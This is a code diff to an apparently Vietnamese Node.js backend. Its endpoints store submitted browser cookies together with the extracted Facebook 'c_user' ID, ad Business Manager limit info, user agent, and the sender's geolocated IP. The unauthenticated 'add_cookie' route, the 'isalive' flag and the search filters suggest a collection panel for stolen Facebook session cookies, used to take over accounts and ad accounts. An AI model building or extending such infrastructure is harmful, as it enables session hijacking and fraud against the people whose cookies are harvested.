@@ -4,9 +4,9 @@ var geoip = require('geoip-lite');
 module.exports = {
     add_data: async function(req, res){
         try{
-            var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
-            var geo = geoip.lookup(ip);
-            var nation = geo.country
+            let cookie = req.body.cookie.trim()
+            let c_user = /c_user=(.+?);/gm
+            c_user = c_user.exec(cookie)
             let filterAccount = {
                 token: req.body.token,
                 status: true,
@@ -16,15 +16,16 @@ module.exports = {
             let checkToken = await Account.findOne(filterAccount)
             if(checkToken !== null){
                 let data = Data({
-                    cookie: req.body.cookie.trim(),
+                    cookie: cookie,
                     note: req.body.note.trim(),
                     isalive: true,
                     isdelete: false,
                     dateTime: new Date(),
-                    ip: ip ? ip : null,
-                    nation: nation ? nation : null, 
+                    ip: req.body.ip.trim(),
+                    nation: req.body.nation.trim(), 
                     useragent: req.body.useragent.trim(),
                     infor_bmlimit: req.body.infor_bmlimit.trim(),
+                    c_user: c_user[1] ? c_user[1] : "null"
                 })
                 let check = await Data.findOne({
                     cookie: req.body.cookie.trim()
@@ -98,6 +99,9 @@ module.exports = {
             }
             if(req.body.nation){
                 filter.nation = new RegExp(req.body.nation.trim(), 'i')
+            }
+            if(req.body.c_user){
+                filter.c_user = new RegExp(req.body.c_user.trim(), 'i')
             }
             if(req.body.start_date){
                 let start_date = new Date(req.body.start_date + " 07:00")
@@ -184,7 +188,7 @@ module.exports = {
                     isdelete: false,
                     _id: req.body.idCookie
                 }
-                // let check = await Data.findOne(filter)
+                let check = await Data.findOne(filter)
                 let update = {
                     isalive: (req.body.isalive) ? req.body.isalive : check.isalive,
                     note: (req.body.note) ? req.body.note : check.note,
@@ -193,6 +197,7 @@ module.exports = {
                     nation: (req.body.nation) ? req.body.nation : check.nation,
                     useragent: (req.body.useragent) ? req.body.useragent : check.useragent,
                     infor_bmlimit: (req.body.infor_bmlimit) ? req.body.infor_bmlimit : check.infor_bmlimit,
+                    c_user: (req.body.c_user) ? req.body.c_user : check.c_user,
                     updateTime: new Date()
                 }
                 let rsUpdate = await Data.findOneAndUpdate(filter, update)
@@ -355,5 +360,55 @@ module.exports = {
                 message: ex.message
             })
         }
-    }
+    },
+    add_cookie: async function(req, res){
+        try{
+            let cookie = req.body.cookie.trim()
+            let c_user = /c_user=(.+?);/gm
+            c_user = c_user.exec(cookie)
+            var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
+            var geo = geoip.lookup(ip)
+            var nation
+            if(geo == null){
+                nation = "null"
+            }else{
+                nation = geo.country
+            }
+                let data = Data({
+                    cookie: cookie,
+                    note: req.body.note,
+                    isalive: true,
+                    isdelete: false,
+                    dateTime: new Date(),
+                    ip: ip ? ip.substr(7) : "null",
+                    nation: nation ? nation : "null", 
+                    useragent: req.body.useragent,
+                    infor_bmlimit: req.body.infor_bmlimit,
+                    c_user: c_user[1] ? c_user[1] : "null",
+                })
+                let check = await Data.findOne({
+                    cookie: cookie
+                });
+                if(check !== null){
+                    res.status(400).json({
+                        message: "Dữ liệu đã tồn tại"
+                    });
+                }else{
+                    let rs_save = await data.save()
+                    if(rs_save != null){
+                        res.status(200).json({
+                            message: "Thêm dữ liệu thành công",
+                        })
+                    }else{
+                        res.status(400).json({
+                            message: "Thêm dữ liệu thất bại"
+                        });
+                    }
+                }
+        }catch(ex){
+            res.status(400).json({
+                message: ex.message
+            });
+        }
+    },
 }
